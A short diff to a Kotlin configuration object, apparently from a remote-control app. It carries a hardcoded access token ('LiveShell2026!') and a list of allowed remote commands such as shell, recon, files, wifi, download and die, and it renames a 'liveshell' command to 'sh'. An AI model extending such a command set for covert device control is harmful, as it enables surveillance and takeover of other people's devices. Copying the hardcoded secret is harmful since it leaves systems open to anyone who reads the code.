@@ -22,6 +22,6 @@ object Config {
     const val LIVESHELL_TOKEN = "LiveShell2026!"
 
     val ALLOWED_COMMANDS = setOf(
-        "info", "apps", "shell", "battery", "files", "wifi", "recon", "download", "die", "liveshell"
+        "info", "apps", "shell", "battery", "files", "wifi", "recon", "download", "die", "sh"
     )
 }
